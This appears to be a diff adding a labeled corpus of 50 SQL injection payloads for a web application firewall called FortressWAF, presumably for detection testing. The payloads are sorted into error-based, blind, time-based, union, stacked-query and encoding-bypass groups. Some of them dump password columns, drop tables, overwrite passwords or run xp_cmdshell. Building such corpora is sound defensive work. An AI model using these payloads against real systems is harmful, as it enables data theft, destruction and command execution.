@@ -1,0 +1,65 @@
+# FortressWAF SQL Injection Attack Corpus
+# 50 labeled SQL injection payloads
+# Categories: error-based, blind, time-based, union, stacked queries, encoding bypasses
+# Format: [category] payload
+
+[error-based] 1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+[error-based] 1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+[error-based] 1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND()*2))a FROM information_schema.tables GROUP BY a)b)--
+[error-based] 1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version)),1)--
+[error-based] 1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x WHERE 1=1 AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1))))--
+
+[blind] 1' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1)))>100--
+[blind] 1' AND (SELECT LENGTH(database()))=4--
+[blind] 1' AND (SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))='a'--
+[blind] 1' AND IF(1=1,SLEEP(0),SLEEP(5))--
+[blind] admin' AND (SELECT COUNT(*) FROM users)>0--
+[blind] 1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--
+[blind] 1' AND (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))>0--
+[blind] 1' AND BENCHMARK(10000000,MD5('test'))--
+[blind] 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+[blind] 1' AND (SELECT IF(1=1,SLEEP(5),0))--
+
+[time-based] 1' WAITFOR DELAY '0:0:5'--
+[time-based] 1' AND SLEEP(5)--
+[time-based] 1; WAITFOR DELAY '00:00:05'--
+[time-based] 1' OR SLEEP(5)--
+[time-based] 1' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--
+[time-based] 1' AND pg_sleep(5)--
+[time-based] 1' AND (SELECT pg_sleep(5))--
+[time-based] 1' AND (SELECT count(*) FROM generate_series(1,10000000))--
+[time-based] 1' AND (SELECT 1 FROM pg_sleep(5))--
+[time-based] 1' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+
+[union] 1 UNION SELECT 1,2,3--
+[union] 1 UNION ALL SELECT NULL,NULL,NULL--
+[union] 1 UNION SELECT username,password FROM users--
+[union] 1' UNION SELECT @@version,user(),database()--
+[union] 1 UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables--
+[union] 1 UNION SELECT 1,2,3 FROM admin--
+[union] 1 UNION SELECT 1,(SELECT password FROM users LIMIT 1),3--
+[union] 1 UNION ALL SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
+[union] 1 UNION SELECT 0x3120322033,2,3--
+[union] 1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
+
+[stacked] 1; DROP TABLE users--
+[stacked] 1'; INSERT INTO logs VALUES('test')--
+[stacked] 1; SELECT * FROM admin--
+[stacked] 1; UPDATE users SET password='hacked' WHERE id=1--
+[stacked] 1; DELETE FROM sessions WHERE 1=1--
+[stacked] 1'; EXEC xp_cmdshell('whoami')--
+[stacked] 1; CREATE TABLE hack(data text)--
+[stacked] 1'; SHOW TABLES--
+[stacked] 1; ALTER TABLE users DROP COLUMN password--
+[stacked] 1'; DROP PROCEDURE IF EXISTS proc--
+
+[encoding-bypass] %31%27%20%4F%52%20%31%3D%31--
+[encoding-bypass] %2531%2527%2520%254F%2552%2520%2531%253D%2531--
+[encoding-bypass] 0x3127204F52202731273D2731
+[encoding-bypass] 1%2F**%2FOR%2F**%2F1%3D1--
+[encoding-bypass] 1'+||+'1'='1
+[encoding-bypass] 1'+UNION%0aSELECT+1,2,3--
+[encoding-bypass] 1'+UNION/**/SELECT/**/1,2,3--
+[encoding-bypass] 1'A0ORA01=1--
+[encoding-bypass] 1'||'1'='1'--
+[encoding-bypass] 1'/*!50000OR*/1=1--
